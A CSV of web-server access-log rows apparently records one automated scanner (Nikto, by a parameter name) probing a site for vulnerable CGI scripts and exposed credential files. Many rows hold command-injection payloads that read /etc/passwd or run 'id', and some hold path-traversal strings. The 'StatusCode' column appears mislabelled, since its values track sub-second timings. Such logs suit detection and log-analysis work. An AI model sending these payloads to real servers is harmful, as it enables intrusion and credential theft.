Country,Date,IP,RequestMethod,Resource,StatusCode,Timestamp
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~daemon,257,11:36:10
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~ftp,381,11:36:10
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~guest,499,11:36:10
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~listen,628,11:36:10
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~lp,746,11:36:10
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~mysql,861,11:36:10
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~noaccess,003,11:36:11
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~nobody,147,11:36:11
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~nobody4,271,11:36:11
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~nuucp,392,11:36:11
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~operator,544,11:36:11
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~root,656,11:36:11
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~smmsp,781,11:36:11
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~smtp,935,11:36:11
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~sshd,067,11:36:12
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~sys,186,11:36:12
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~test,292,11:36:12
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~unknown,420,11:36:12
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~uucp,548,11:36:12
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~web,672,11:36:12
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~www,794,11:36:12
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~adm,911,11:36:12
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~bin,054,11:36:13
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~daemon,168,11:36:13
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~ftp,286,11:36:13
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~guest,414,11:36:13
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~listen,547,11:36:13
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~lp,919,11:36:13
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~mysql,209,11:36:14
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~noaccess,361,11:36:14
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~nobody,485,11:36:14
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~nobody4,630,11:36:14
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~nuucp,754,11:36:14
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~operator,889,11:36:14
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~root,997,11:36:14
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~smmsp,142,11:36:15
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~smtp,288,11:36:15
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~sshd,424,11:36:15
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~sys,567,11:36:15
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~test,714,11:36:15
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~unknown,863,11:36:15
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~uucp,004,11:36:16
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~web,129,11:36:16
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~www,266,11:36:16
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~ZA3Z1,532,11:36:16
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~ZA3Z1,703,11:36:16
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~root,826,11:36:16
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~root,933,11:36:16
United States,2018-03-28,76.100.27.231,GET,dbman/db.cgi?db=no-db,067,11:36:17
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/dbman/db.cgi?db=no-db,230,11:36:17
United States,2018-03-28,76.100.27.231,GET,dcshop/auth_data/auth_user_file.txt,397,11:36:17
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/dcshop/auth_data/auth_user_file.txt,537,11:36:17
United States,2018-03-28,76.100.27.231,GET,DCShop/auth_data/auth_user_file.txt,663,11:36:17
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/DCShop/auth_data/auth_user_file.txt,881,11:36:17
United States,2018-03-28,76.100.27.231,GET,dcshop/orders/orders.txt,018,11:36:18
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/dcshop/orders/orders.txt,165,11:36:18
United States,2018-03-28,76.100.27.231,GET,DCShop/orders/orders.txt,315,11:36:18
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/DCShop/orders/orders.txt,451,11:36:18
United States,2018-03-28,76.100.27.231,GET,dumpenv.pl,595,11:36:18
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/dumpenv.pl,749,11:36:18
United States,2018-03-28,76.100.27.231,GET,htsearch?-c/nonexistant,886,11:36:18
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/htsearch?-c/nonexistant,034,11:36:19
United States,2018-03-28,76.100.27.231,GET,mkilog.exe,155,11:36:19
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/mkilog.exe,317,11:36:19
United States,2018-03-28,76.100.27.231,GET,mkplog.exe,457,11:36:19
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/mkplog.exe,590,11:36:19
United States,2018-03-28,76.100.27.231,GET,orders/orders.txt,724,11:36:19
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/orders/orders.txt,842,11:36:19
United States,2018-03-28,76.100.27.231,GET,processit.pl,009,11:36:20
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/processit.pl,151,11:36:20
United States,2018-03-28,76.100.27.231,GET,rpm_query,314,11:36:20
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/rpm_query,463,11:36:20
United States,2018-03-28,76.100.27.231,GET,"sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3",628,11:36:20
United States,2018-03-28,76.100.27.231,GET,"/cgi-bin/sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3",793,11:36:20
United States,2018-03-28,76.100.27.231,GET,shop/auth_data/auth_user_file.txt,965,11:36:20
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/shop/auth_data/auth_user_file.txt,123,11:36:21
United States,2018-03-28,76.100.27.231,GET,shop/orders/orders.txt,249,11:36:21
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/shop/orders/orders.txt,403,11:36:21
United States,2018-03-28,76.100.27.231,GET,ws_ftp.ini,537,11:36:21
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/ws_ftp.ini,676,11:36:21
United States,2018-03-28,76.100.27.231,GET,WS_FTP.ini,807,11:36:21
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/WS_FTP.ini,942,11:36:21
United States,2018-03-28,76.100.27.231,GET,/?sql_debug=1,061,11:36:22
United States,2018-03-28,76.100.27.231,GET,/a_security.htm,200,11:36:22
United States,2018-03-28,76.100.27.231,GET,/Admin_files/order.log,335,11:36:22
United States,2018-03-28,76.100.27.231,GET,/admin.html,466,11:36:22
United States,2018-03-28,76.100.27.231,GET,/admin/cplogfile.log,583,11:36:22
United States,2018-03-28,76.100.27.231,GET,/admin/system_footer.php,706,11:36:22
United States,2018-03-28,76.100.27.231,GET,/cfdocs/snippets/fileexists.cfm,862,11:36:22
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/MachineInfo,005,11:36:23
United States,2018-03-28,76.100.27.231,GET,/chat/!nicks.txt,155,11:36:23
United States,2018-03-28,76.100.27.231,GET,/chat/!pwds.txt,320,11:36:23
United States,2018-03-28,76.100.27.231,GET,/chat/data/usr,476,11:36:23
United States,2018-03-28,76.100.27.231,GET,/com,607,11:36:23
United States,2018-03-28,76.100.27.231,GET,/COM,978,11:36:23
United States,2018-03-28,76.100.27.231,GET,/config.php,303,11:36:24
United States,2018-03-28,76.100.27.231,GET,/config/,598,11:36:24
United States,2018-03-28,76.100.27.231,GET,/cplogfile.log,840,11:36:24
United States,2018-03-28,76.100.27.231,GET,/cutenews/index.php?debug,038,11:36:25
United States,2018-03-28,76.100.27.231,GET,/examples/jsp/snp/anything.snp,225,11:36:25
United States,2018-03-28,76.100.27.231,GET,/file-that-is-not-real-2002.php3,362,11:36:25
United States,2018-03-28,76.100.27.231,GET,/index.php?sql_debug=1,530,11:36:25
United States,2018-03-28,76.100.27.231,GET,view-source?view-source,702,11:36:25
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/view-source?view-source,883,11:36:25
United States,2018-03-28,76.100.27.231,GET,webplus?about,997,11:36:25
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/webplus?about,118,11:36:26
United States,2018-03-28,76.100.27.231,GET,/cfdocs/snippets/viewexample.cfm,259,11:36:26
United States,2018-03-28,76.100.27.231,GET,/chassis/config/GeneralChassisConfig.html,392,11:36:26
United States,2018-03-28,76.100.27.231,GET,ibill.pm,522,11:36:26
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/ibill.pm,662,11:36:26
United States,2018-03-28,76.100.27.231,GET,scoadminreg.cgi,782,11:36:26
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/scoadminreg.cgi,981,11:36:26
United States,2018-03-28,76.100.27.231,GET,SGB_DIR/superguestconfig,159,11:36:27
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/SGB_DIR/superguestconfig,361,11:36:27
United States,2018-03-28,76.100.27.231,GET,/hp/device/this.LCDispatcher,575,11:36:27
United States,2018-03-28,76.100.27.231,GET,/cfdocs/snippets/evaluate.cfm,716,11:36:27
United States,2018-03-28,76.100.27.231,GET,/cfide/Administrator/startstop.html,903,11:36:27
United States,2018-03-28,76.100.27.231,GET,icat,034,11:36:28
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/icat,241,11:36:28
United States,2018-03-28,76.100.27.231,GET,MsmMask.exe?mask=/junk334,354,11:36:28
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/MsmMask.exe?mask=/junk334,469,11:36:28
United States,2018-03-28,76.100.27.231,GET,MsmMask.exe?mask=/junk334,599,11:36:28
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/MsmMask.exe?mask=/junk334,726,11:36:28
United States,2018-03-28,76.100.27.231,GET,MsmMask.exe?mask=/junk334,876,11:36:28
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/MsmMask.exe?mask=/junk334,004,11:36:29
United States,2018-03-28,76.100.27.231,GET,MsmMask.exe?mask=/junk334,136,11:36:29
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/MsmMask.exe?mask=/junk334,263,11:36:29
United States,2018-03-28,76.100.27.231,GET,MsmMask.exe?mask=/junk334,390,11:36:29
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/MsmMask.exe?mask=/junk334,532,11:36:29
United States,2018-03-28,76.100.27.231,GET,nph-showlogs.pl?files=../../&filter=.*&submit=Go&linecnt=500&refresh=0,658,11:36:29
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/nph-showlogs.pl?files=../../&filter=.*&submit=Go&linecnt=500&refresh=0,809,11:36:29
United States,2018-03-28,76.100.27.231,GET,query?mss=%2e%2e/config,960,11:36:29
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/query?mss=%2e%2e/config,098,11:36:30
United States,2018-03-28,76.100.27.231,GET,test-cgi?/*,220,11:36:30
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/test-cgi?/*,334,11:36:30
United States,2018-03-28,76.100.27.231,GET,update.dpgs,453,11:36:30
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/update.dpgs,597,11:36:30
United States,2018-03-28,76.100.27.231,GET,view-source,743,11:36:30
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/view-source,946,11:36:30
United States,2018-03-28,76.100.27.231,GET,wrap,105,11:36:31
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/wrap,253,11:36:31
United States,2018-03-28,76.100.27.231,GET,/Mem/dynaform/FileExplorer.htm,406,11:36:31
United States,2018-03-28,76.100.27.231,GET,FormHandler.cgi?realname=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com,522,11:36:31
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/FormHandler.cgi?realname=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com,676,11:36:31
United States,2018-03-28,76.100.27.231,GET,FormHandler.cgi?realNikto=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com,893,11:36:31
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/FormHandler.cgi?realNikto=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com,089,11:36:32
United States,2018-03-28,76.100.27.231,POST,lastlines.cgi?process,266,11:36:32
United States,2018-03-28,76.100.27.231,POST,/cgi-bin/lastlines.cgi?process,387,11:36:32
United States,2018-03-28,76.100.27.231,GET,calendar_admin.pl?config=|cat%20/etc/passwd|,543,11:36:32
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/calendar_admin.pl?config=|cat%20/etc/passwd|,700,11:36:32
United States,2018-03-28,76.100.27.231,GET,calendar/calendar_admin.pl?config=|cat%20/etc/passwd|,864,11:36:32
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/calendar/calendar_admin.pl?config=|cat%20/etc/passwd|,030,11:36:33
United States,2018-03-28,76.100.27.231,GET,campas?%0acat%0a/etc/passwd%0a,242,11:36:33
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/campas?%0acat%0a/etc/passwd%0a,376,11:36:33
United States,2018-03-28,76.100.27.231,GET,cgicso?query=AAA,537,11:36:33
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgicso?query=AAA,664,11:36:33
United States,2018-03-28,76.100.27.231,GET,cgiwrap,784,11:36:33
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap,916,11:36:33
United States,2018-03-28,76.100.27.231,GET,common/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|,061,11:36:34
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/common/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|,189,11:36:34
United States,2018-03-28,76.100.27.231,GET,Count.cgi,316,11:36:34
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/Count.cgi,458,11:36:34
United States,2018-03-28,76.100.27.231,GET,csChatRBox.cgi?command=savesetup&setup=;system('cat%20/etc/passwd'),612,11:36:34
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/csChatRBox.cgi?command=savesetup&setup=;system('cat%20/etc/passwd'),749,11:36:34
United States,2018-03-28,76.100.27.231,GET,csGuestBook.cgi?command=savesetup&setup=;system('cat%20/etc/passwd'),910,11:36:34
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/csGuestBook.cgi?command=savesetup&setup=;system('cat%20/etc/passwd'),038,11:36:35
United States,2018-03-28,76.100.27.231,GET,csLiveSupport.cgi?command=savesetup&setup=;system('cat%20/etc/passwd'),178,11:36:35
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/csLiveSupport.cgi?command=savesetup&setup=;system('cat%20/etc/passwd'),388,11:36:35
United States,2018-03-28,76.100.27.231,GET,csNewsPro.cgi?command=savesetup&setup=;system('cat%20/etc/passwd'),518,11:36:35
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/csNewsPro.cgi?command=savesetup&setup=;system('cat%20/etc/passwd'),645,11:36:35
United States,2018-03-28,76.100.27.231,GET,echo.bat,775,11:36:35
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/echo.bat,931,11:36:35
United States,2018-03-28,76.100.27.231,GET,ImageFolio/admin/admin.cgi,101,11:36:36
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/ImageFolio/admin/admin.cgi,219,11:36:36
United States,2018-03-28,76.100.27.231,GET,info2www,905,11:36:36
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/info2www,076,11:36:37
United States,2018-03-28,76.100.27.231,GET,infosrch.cgi,208,11:36:37
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/infosrch.cgi,349,11:36:37
United States,2018-03-28,76.100.27.231,GET,listrec.pl,532,11:36:37
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/listrec.pl,686,11:36:37
United States,2018-03-28,76.100.27.231,GET,mailnews.cgi,830,11:36:37
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/mailnews.cgi,950,11:36:37
United States,2018-03-28,76.100.27.231,GET,mmstdod.cgi,094,11:36:38
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/mmstdod.cgi,244,11:36:38
United States,2018-03-28,76.100.27.231,GET,pagelog.cgi,385,11:36:38
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/pagelog.cgi,534,11:36:38
United States,2018-03-28,76.100.27.231,GET,perl?-v,685,11:36:38
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/perl?-v,843,11:36:38
United States,2018-03-28,76.100.27.231,GET,perl.exe?-v,988,11:36:38
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/perl.exe?-v,124,11:36:39
United States,2018-03-28,76.100.27.231,GET,perl.exe,302,11:36:39
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/perl.exe,444,11:36:39
United States,2018-03-28,76.100.27.231,GET,perl,590,11:36:39
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/perl,705,11:36:39
United States,2018-03-28,76.100.27.231,GET,plusmail,844,11:36:39
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/plusmail,977,11:36:39
United States,2018-03-28,76.100.27.231,GET,smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|,190,11:36:41
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|,364,11:36:41
United States,2018-03-28,76.100.27.231,GET,smartsearch/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|,549,11:36:41
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/smartsearch/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|,734,11:36:41
United States,2018-03-28,76.100.27.231,GET,spin_client.cgi?aaaaaaaa,929,11:36:41
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/spin_client.cgi?aaaaaaaa,078,11:36:42
United States,2018-03-28,76.100.27.231,GET,sscd_suncourier.pl,237,11:36:42
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/sscd_suncourier.pl,370,11:36:42
United States,2018-03-28,76.100.27.231,GET,viralator.cgi,481,11:36:42
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/viralator.cgi,646,11:36:42
United States,2018-03-28,76.100.27.231,GET,virgil.cgi,785,11:36:42
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/virgil.cgi,899,11:36:42
United States,2018-03-28,76.100.27.231,GET,vpasswd.cgi,053,11:36:43
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/vpasswd.cgi,205,11:36:43
United States,2018-03-28,76.100.27.231,GET,webgais,346,11:36:43
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/webgais,485,11:36:43
United States,2018-03-28,76.100.27.231,GET,websendmail,628,11:36:43
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/websendmail,766,11:36:43
United States,2018-03-28,76.100.27.231,GET,whois.cgi?action=load&whois=%3Bid,907,11:36:43
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/whois.cgi?action=load&whois=%3Bid,036,11:36:44
United States,2018-03-28,76.100.27.231,GET,wwwwais,180,11:36:44
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/wwwwais,340,11:36:44
United States,2018-03-28,76.100.27.231,GET,/cd-cgi/sscd_suncourier.pl,488,11:36:44
United States,2018-03-28,76.100.27.231,GET,common/listrec.pl,627,11:36:44
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/common/listrec.pl,781,11:36:44
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/handler,916,11:36:44
